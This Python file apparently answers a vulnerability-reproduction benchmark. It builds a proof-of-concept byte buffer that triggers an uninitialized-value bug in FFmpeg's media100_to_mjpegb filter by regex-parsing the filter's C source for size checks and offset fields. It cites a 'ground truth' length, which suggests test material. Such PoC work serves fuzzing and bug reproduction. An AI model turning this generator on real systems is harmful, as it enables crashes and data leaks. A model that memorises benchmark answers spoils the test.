import tarfile
import re
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Uninitialized Value vulnerability in media100_to_mjpegb.
        
        Strategy:
        1. Extract the 'media100_to_mjpegb_bsf.c' source from the tarball to analyze constraints.
        2. Identify input size requirements and valid offset locations by regex parsing the C code.
        3. Construct a byte buffer that satisfies the size check.
        4. Populate identified offset fields with pointers into the buffer to ensure the BSF 
           processes the data and triggers the output allocation where the uninitialized padding issue resides.
        """
        
        # Ground truth length is 1025, which is a safe default.
        default_len = 1025
        bsf_source = ""
        
        # 1. Try to extract source code for analysis
        try:
            with tarfile.open(src_path, 'r') as tar:
                for member in tar.getmembers():
                    if member.name.endswith('media100_to_mjpegb_bsf.c'):
                        f = tar.extractfile(member)
                        if f:
                            bsf_source = f.read().decode('utf-8', errors='ignore')
                        break
        except Exception:
            # Fallback if tar extraction fails
            pass

        offsets_to_patch = set()
        min_size = 0

        # 2. Analyze source constraints
        if bsf_source:
            # Find minimum size check: "if (in->size < 123)"
            size_matches = re.findall(r'(?:in|pkt)->size\s*<\s*(\d+)', bsf_source)
            for m in size_matches:
                v = int(m)
                if v > min_size:
                    min_size = v
            
            # Find offset reads: "AV_RB32(in->data + 123)"
            # These are locations where the code expects 32-bit integers, likely offsets
            read_matches = re.findall(r'AV_R[BL]32\s*\(\s*(?:in|pkt)->data\s*\+\s*(\d+)\s*\)', bsf_source)
            for m in read_matches:
                offsets_to_patch.add(int(m))
        else:
            # Fallback constraints if source not found
            # Known/Likely offsets for Media100 headers
            offsets_to_patch = {8, 12, 16}
            min_size = 128

        # 3. Construct the buffer
        # Ensure buffer is large enough for min_size and ground truth heuristic
        final_len = max(default_len, min_size + 128)
        poc = bytearray(final_len)

        # 4. Populate Offsets
        # Set a data pointer that points to valid data area within the buffer
        # This prevents out-of-bounds reads and ensures the conversion logic proceeds
        data_ptr = min_size + 64 if min_size > 0 else 256
        if data_ptr >= final_len:
            data_ptr = final_len // 2

        sorted_offsets = sorted(list(offsets_to_patch))
        for off in sorted_offsets:
            if off + 4 <= final_len:
                # Write a valid offset (Big Endian, as is standard for Media100/Qt)
                struct.pack_into('>I', poc, off, data_ptr)
                
                # Advance pointer to simulate different fields/chunks
                data_ptr += 128
                # Wrap around if needed to stay within bounds
                if data_ptr >= final_len:
                    data_ptr = (min_size + 64) if min_size > 0 else 256
                    if data_ptr >= final_len: data_ptr = 64

        return bytes(poc)
